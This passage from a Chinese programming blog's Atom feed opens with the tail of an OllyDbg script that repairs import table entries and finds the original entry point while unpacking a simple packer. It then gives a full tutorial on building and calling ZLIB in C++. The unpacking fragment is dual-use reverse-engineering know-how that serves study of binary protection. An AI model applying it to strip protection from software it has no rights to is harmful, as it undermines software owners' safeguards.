dwWriteIATAddr,&quot;x&quot;</span><br><span class="line">BPHWS dwOEPAddr,&quot;x&quot;</span><br><span class="line"></span><br><span class="line">FIND:</span><br><span class="line">  RUN  </span><br><span class="line"></span><br><span class="line">CASE1:</span><br><span class="line">  CMP eip,dwGetProcAddr</span><br><span class="line">  JNE CASE2   </span><br><span class="line">  MOV dwEAX,eax     </span><br><span class="line">  JMP FIND   </span><br><span class="line"></span><br><span class="line">CASE2:</span><br><span class="line">  CMP eip,dwWriteIATAddr  </span><br><span class="line">  JNE CASE3</span><br><span class="line">  MOV [edi],dwEAX   </span><br><span class="line">  JMP FIND     </span><br><span class="line"></span><br><span class="line">CASE3:</span><br><span class="line">  CMP eip,dwOEPAddr   </span><br><span class="line">  JNE FIND</span><br><span class="line">  MSG &quot;OEP&quot;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简易加密壳&quot;&gt;&lt;a href=&quot;#简易加密壳&quot; class=&quot;headerlink&quot; title=&quot;简易加密壳&quot;&gt;&lt;/a&gt;简易加密壳&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/yeanhoo/encryptPacker&quot; target=
      
    
    </summary>
    
    
      <category term="C\C++" scheme="http://yeanhoo.gitee.io/categories/C-C/"/>
    
    
      <category term="简易加密壳" scheme="http://yeanhoo.gitee.io/tags/%E7%AE%80%E6%98%93%E5%8A%A0%E5%AF%86%E5%A3%B3/"/>
    
      <category term="PE文件" scheme="http://yeanhoo.gitee.io/tags/PE%E6%96%87%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>使用ZLIB库压缩与解压缩</title>
    <link href="http://yeanhoo.gitee.io/2020/12/24/%E4%BD%BF%E7%94%A8ZLIB%E5%BA%93%E5%8E%8B%E7%BC%A9%E4%B8%8E%E8%A7%A3%E5%8E%8B%E7%BC%A9/"/>
    <id>http://yeanhoo.gitee.io/2020/12/24/%E4%BD%BF%E7%94%A8ZLIB%E5%BA%93%E5%8E%8B%E7%BC%A9%E4%B8%8E%E8%A7%A3%E5%8E%8B%E7%BC%A9/</id>
    <published>2020-12-24T15:38:42.423Z</published>
    <updated>2020-12-24T15:32:01.956Z</updated>
    
    <content type="html"><![CDATA[<h2 id="使用ZLIB库压缩与解压缩"><a href="#使用ZLIB库压缩与解压缩" class="headerlink" title="使用ZLIB库压缩与解压缩"></a>使用ZLIB库压缩与解压缩</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><hr><p>​        <code>ZLIB</code>是一套免费、通用、无损的数据压缩库，可以在任何硬件及操作系统上使用，而且<code>ZLIB</code>数据格 式可以跨平台移植。<code>ZLIB</code>提供了一套<code>in-memory</code>压缩和解压函数，并能检测解压出来的数据的完整性，<code>ZLIB</code>也支持读写<code>gzip（.gz）</code>格式的文件.</p><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><hr><ul><li>ZLIB<a href="https://zlib.net/" target="_blank" rel="noopener">官网下载</a>ZLIB库的源码</li><li>打开\contrib\vstudio\vc[<code>对应的编译环境版本,选择最接近自己环境的即可</code>]\zlibvc.sln项目</li><li>编译<code>zlibstat</code>静态库、生成<code>zlibstat.lib</code></li><li>新建项目，复制<code>ZLIB</code>官网下回来的<code>zlib.h</code>、<code>zconf.h</code>和编译好的<code>zlibstat.lib</code>到项目目录</li></ul><h3 id="编译环境配置"><a href="#编译环境配置" class="headerlink" title="编译环境配置"></a>编译环境配置</h3><hr><ul><li><strong>Debug编译模式下的编译设置</strong><br>首先，打开项目工程的属性页，展开“C/C++”，单击“预处理器”，在“预处理器定义”中添加<code>ZLIB_WINAPI</code>，否则，代码不能 编译通过。<br>接着，单击“代码生成”，在“运行库”中设置为“/MTd”选项，表示在Debug模式下的多线程静态编译。<br>最后，展开“链接器”，单击“命令行”，在“其他选项（D）”编辑框中添加链接命 令“/FORCE:MULTIPLE”，这个选项使链接器创建一个有效的exe文件或dll文件，即使一个函数或变量多次 引用或多处定义。</li><li><strong>Release编译模式下的编译设置</strong><br>和Debug模式一样，首先打开项目工程的属性页，展开“C/C++”，单击“预处理器”，在“预处理器定义”中添加<code>ZLIB_WINAPI</code>，否则，代码不能 编译通过。<br>接着，单击“代码生成”，在“运行库”中设置为“/MT”选项，表示在Release模式下的多线程静态编译。<br>最后，展开“链接器”，单击“命令行”，在“其他选项（D）”编辑框中添加链接命令“/SAFESEH:NO”， 这样就解决了“SAFESEH 映像不安全”的问题。</li><li>注意,使用<code>zlib-1.2.11</code>时存在一个问题,编译<code>zlibstat.lib</code>库的时候需要将Realize更改为<code>ReleaseWithoutAsm</code>,否则在实际调用zlib解压函数时可能会导致异常</li></ul><h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><hr><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/************************************main.h  头文件*************************************/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;shlwapi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"zconf.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"zlib.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"zlibstat.lib"</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"shlwapi.lib"</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_SRC_FILE_SIZE (500*1024*1024)<span class="comment">//500M</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Zlib_ShowError</span><span class="params">(<span class="keyword">char</span> *pszText)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> szErr[MAX_PATH] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="built_in">sprintf</span>(szErr,<span class="string">"%s Error[%d]\n"</span>,pszText,GetLastError());</span><br><span class="line">MessageBox(<span class="literal">NULL</span>,szErr,<span class="string">"ERROR"</span>,MB_OK | MB_ICONERROR);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 数据压缩</span></span><br><span class="line"><span class="comment">// 输入：将要压缩文件的路径</span></span><br><span class="line"><span class="comment">// 输出：数据压缩后的压缩数据内容、数据压缩后的压缩数据内容长度</span></span><br><span class="line"><span class="function">BOOL <span class="title">Zlib_CompressData</span><span class="params">(<span class="keyword">char</span> *pszCompressFileName,BYTE ** ppCompressData,DWORD *pdwCompressDataSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//*************压缩文件********************//</span></span><br><span class="line">HANDLE hFile = CreateFile(pszCompressFileName,GENERIC_READ,FILE_SHARE_READ | FILE_SHARE_WRITE,<span class="literal">NULL</span>,OPEN_EXISTING,FILE_ATTRIBUTE_ARCHIVE,<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (INVALID_HANDLE_VALUE == hFile)</span><br><span class="line">&#123;</span><br><span class="line">Zlib_ShowError(<span class="string">"CreateFile"</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD dwFileSize = GetFileSize(hFile, <span class="literal">NULL</span>);       <span class="comment">// 获取文件大小</span></span><br><span class="line"><span class="keyword">if</span> (MAX_SRC_FILE_SIZE &lt; dwFileSize)</span><br><span class="line">&#123;</span><br><span class="line">CloseHandle(hFile);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断是否满足大小限制条件</span></span><br><span class="line"><span class="keyword">if</span> (MAX_SRC_FILE_SIZE &lt; dwFileSize)</span><br><span class="line">&#123;</span><br><span class="line">CloseHandle(hFile);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">DWORD dwDestDataSize = dwFileSize;</span><br><span class="line"></span><br><span class="line">BYTE *pSrcData = <span class="keyword">new</span> BYTE[dwFileSize];</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == pSrcData)</span><br><span class="line">&#123;</span><br><span class="line">CloseHandle(hFile);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">BYTE *pDestData = <span class="keyword">new</span> BYTE[dwDestDataSize];</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == pDestData)</span><br><span class="line">&#123;</span><br><span class="line">CloseHandle(hFile);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD dwRet = <span class="number">0</span>;</span><br><span class="line">ReadFile(hFile, pSrcData, dwFileSize, &amp;dwRet, <span class="literal">NULL</span>); <span class="comment">// 读取文件数据</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="number">0</span> &gt;= dwRet) ||</span><br><span class="line">(dwRet != dwFileSize))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">delete</span>[]pDestData;</span><br><span class="line">pDestData = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">delete</span>[]pSrcData;</span><br><span class="line">pSrcData = <span class="literal">NULL</span>;</span><br><span class="line">CloseHandle(hFile);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 压缩数据</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">int compress(Bytef *dest, uLongf *destLen, const Bytef *source, uLong sourceLen);</span></span><br><span class="line"><span class="comment">compress函数将source缓冲区中的内容压缩到dest缓冲区。sourceLen表示source缓冲区的大小（以字节计）。</span></span><br><span class="line"><span class="comment">注意：函数的第二个参数destLen是传址调用，当调用函数时，destLen表示dest缓冲区大小（初始值不能为0哦），</span></span><br><span class="line"><span class="comment">( destLen &gt; (sourceLen + 12) * 100.1% )；当函数退出后，destLen表示压缩后缓冲区的实际大小。</span></span><br><span class="line"><span class="comment">此时，destLen/sourceLen正好是压缩率!!!</span></span><br><span class="line"><span class="comment">返回值：</span></span><br><span class="line"><span class="comment">-5 : 输出缓冲区不够大；</span></span><br><span class="line"><span class="comment">-4 : 没有足够的内存；</span></span><br><span class="line"><span class="comment">0 : 表示成功；</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">int</span> iRet = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">iRet = compress(pDestData, &amp;dwDestDataSize, pSrcData, dwFileSize);</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> == iRet)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 成功</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">-5</span> == iRet)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 输出缓冲区不够大, 以 100KB 大小递增</span></span><br><span class="line"><span class="keyword">delete</span>[]pDestData;</span><br><span class="line">pDestData = <span class="literal">NULL</span>;</span><br><span class="line">dwDestDataSize = dwDestDataSize + (<span class="number">100</span> * <span class="number">1024</span>);</span><br><span class="line">pDestData = <span class="keyword">new</span> BYTE[dwDestDataSize];</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == pDestData)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">delete</span>[]pSrcData;</span><br><span class="line">pSrcData = <span class="literal">NULL</span>;</span><br><span class="line">CloseHandle(hFile);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 没有足够的内存 或 其他情况</span></span><br><span class="line"><span class="keyword">delete</span>[]pDestData;</span><br><span class="line">pDestData = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">delete</span>[]pSrcData;</span><br><span class="line">pSrcData = <span class="literal">NULL</span>;</span><br><span class="line">CloseHandle(hFile);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (TRUE);</span><br><span class="line"><span class="comment">// 返回数据</span></span><br><span class="line">*ppCompressData = pDestData;</span><br><span class="line">*pdwCompressDataSize = dwDestDataSize;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放</span></span><br><span class="line"><span class="comment">//delete[]pDestData;</span></span><br><span class="line"><span class="comment">//pDestData = NULL;</span></span><br><span class="line"><span class="keyword">delete</span>[]pSrcData;</span><br><span class="line">pSrcData = <span class="literal">NULL</span>;</span><br><span class="line">CloseHandle(hFile);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL <span class="title">SaveToFile</span><span class="params">(<span class="keyword">char</span> *pszFileName,BYTE *pData,DWORD dwDataSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hFile = CreateFile(pszFileName,GENERIC_READ | GENERIC_WRITE,FILE_SHARE_READ | FILE_SHARE_WRITE,<span class="literal">NULL</span>,CREATE_ALWAYS,FILE_ATTRIBUTE_ARCHIVE,<span class="literal">NULL</span>);</span><br><span class="line">DWORD dwRet = <span class="number">0</span>;</span><br><span class="line">WriteFile(hFile,pData,dwDataSize,&amp;dwRet,<span class="literal">NULL</span>);</span><br><span class="line">CloseHandle(hFile);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数据解压</span></span><br><span class="line"><span class="comment">// 输入：将要解压缩文件的路径</span></span><br><span class="line"><span class="comment">// 输出：数据解压后的数据内容、数据解压后的内容长度</span></span><br><span class="line"><span class="function">BOOL <span class="title">Zlib_UncompressData</span><span class="params">(<span class="keyword">char</span> *pszUncompressFileName, BYTE **ppUncompressData, DWORD *pdwUncompressDataSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 注意可能出现压缩后的文件比压缩前的文件大的现象!!!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 打开文件 并 获取文件数据</span></span><br><span class="line">HANDLE hFile = CreateFile(pszUncompressFileName, GENERIC_READ,</span><br><span class="line">FILE_SHARE_READ | FILE_SHARE_WRITE, <span class="literal">NULL</span>, OPEN_EXISTING,</span><br><span class="line">FILE_ATTRIBUTE_ARCHIVE, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (INVALID_HANDLE_VALUE == hFile)</span><br><span class="line">&#123;</span><br><span class="line">Zlib_ShowError(<span class="string">"CreateFile"</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD dwFileSize = GetFileSize(hFile, <span class="literal">NULL</span>);       <span class="comment">// 获取文件大小</span></span><br><span class="line">DWORD dwDestDataSize = MAX_SRC_FILE_SIZE;</span><br><span class="line"></span><br><span class="line">BYTE *pSrcData = <span class="keyword">new</span> BYTE[dwFileSize];</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == pSrcData)</span><br><span class="line">&#123;</span><br><span class="line">CloseHandle(hFile);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">BYTE *pDestData = <span class="keyword">new</span> BYTE[dwDestDataSize];</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == pDestData)</span><br><span class="line">&#123;</span><br><span class="line">CloseHandle(hFile);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD dwRet = <span class="number">0</span>;</span><br><span class="line">ReadFile(hFile, pSrcData, dwFileSize, &amp;dwRet, <span class="literal">NULL</span>); <span class="comment">// 读取文件数据</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="number">0</span> &gt;= dwRet) ||(dwRet != dwFileSize))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">delete</span>[]pDestData;</span><br><span class="line">pDestData = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">delete</span>[]pSrcData;</span><br><span class="line">pSrcData = <span class="literal">NULL</span>;</span><br><span class="line">CloseHandle(hFile);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解压缩数据</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">int uncompress(Bytef *dest, uLongf *destLen, const Bytef *source, uLong sourceLen);</span></span><br><span class="line"><span class="comment">compress函数将source缓冲区中的内容压缩到dest缓冲区。sourceLen表示source缓冲区的大小（以字节计）。</span></span><br><span class="line"><span class="comment">注意：函数的第二个参数destLen是传址调用，当调用函数时，destLen表示dest缓冲区大小（初始值不能为0哦），</span></span><br><span class="line"><span class="comment">( destLen &gt; (sourceLen + 12) * 100.1% )；当函数退出后，destLen表示压缩后缓冲区的实际大小。</span></span><br><span class="line"><span class="comment">此时，destLen/sourceLen正好是压缩率!!!</span></span><br><span class="line"><span class="comment">返回值：</span></span><br><span class="line"><span class="comment">-5 : 输出缓冲区不够大；</span></span><br><span class="line"><span class="comment">-4 : 没有足够的内存；</span></span><br><span class="line"><span class="comment">0 : 表示成功；</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">int</span> iRet = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">iRet = uncompress(pDestData, &amp;dwDestDataSize, pSrcData, dwFileSize);</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> == iRet)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 成功</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">-5</span> == iRet)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 输出缓冲区不够大, 以 100KB 大小递增</span></span><br><span class="line"><span class="keyword">delete</span>[]pDestData;</span><br><span class="line">pDestData = <span class="literal">NULL</span>;</span><br><span class="line">dwDestDataSize = dwDestDataSize + (<span class="number">100</span> * <span class="number">1024</span>);</span><br><span class="line">pDestData = <span class="keyword">new</span> BYTE[dwDestDataSize];</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == pDestData)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">delete</span>[]pSrcData;</span><br><span class="line">pSrcData = <span class="literal">NULL</span>;</span><br><span class="line">CloseHandle(hFile);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 没有足够的内存 或 其他情况</span></span><br><span class="line"><span class="keyword">delete</span>[]pDestData;</span><br><span class="line">pDestData = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">delete</span>[]pSrcData;</span><br><span class="line">pSrcData = <span class="literal">NULL</span>;</span><br><span class="line">CloseHandle(hFile);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (TRUE);</span><br><span class="line"><span class="comment">// 返回数据</span></span><br><span class="line">*ppUncompressData = pDestData;</span><br><span class="line">*pdwUncompressDataSize = dwDestDataSize;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放</span></span><br><span class="line"><span class="comment">//delete[]pDestData;</span></span><br><span class="line"><span class="comment">//pDestData = NULL;</span></span><br><span class="line"><span class="keyword">delete</span>[]pSrcData;</span><br><span class="line">pSrcData = <span class="literal">NULL</span>;</span><br><span class="line">CloseHandle(hFile);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/************************************main.cpp  *************************************/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"main.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[],<span class="keyword">char</span> *envp[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BOOL bRet = FALSE;</span><br><span class="line">BYTE *pCompressData = <span class="literal">NULL</span>;</span><br><span class="line">DWORD dwCompressDataSize = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">BYTE *pUncompressData = <span class="literal">NULL</span>;</span><br><span class="line">DWORD dwUncompressDataSize = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">bRet = Zlib_CompressData(argv[<span class="number">1</span>],&amp;pCompressData,&amp;dwCompressDataSize);</span><br><span class="line"><span class="comment">//BOOL Zlib_CompressData(char *pszCompressFileName,BYTE ** ppCompressData,DWORD *pdwCompressDataSize)</span></span><br><span class="line"><span class="keyword">if</span>(bRet == FALSE)</span><br><span class="line">&#123;</span><br><span class="line">Zlib_ShowError(<span class="string">"Zlib_CompressData fail!"</span>);</span><br><span class="line"><span class="keyword">delete</span> [] pCompressData;</span><br><span class="line">pCompressData = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SaveToFile(<span class="string">"yeanhoo.myzip"</span>,pCompressData,dwCompressDataSize);</span><br><span class="line">bRet = Zlib_UncompressData(<span class="string">"yeanhoo.myzip"</span>,&amp;pUncompressData,&amp;dwUncompressDataSize);</span><br><span class="line"><span class="comment">//BOOL Zlib_UncompressData(char *pszUncompressFileName, BYTE **ppUncompressData, DWORD *pdwUncompressDataSize)</span></span><br><span class="line"><span class="keyword">if</span>(bRet == FALSE)</span><br><span class="line">&#123;</span><br><span class="line">Zlib_ShowError(<span class="string">"Zlib_UncompressData fail!"</span>);</span><br><span class="line"><span class="keyword">delete</span> [] pUncompressData;</span><br><span class="line">pUncompressData = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">delete</span> [] pCompressData;</span><br><span class="line">pCompressData = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">SaveToFile(<span class="string">"yeanhoo.exe"</span>,pUncompressData,dwUncompressDataSize);</span><br><span class="line"><span class="keyword">delete</span> [] pUncompressData;</span><br><span class="line">pUncompressData = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">delete</span> [] 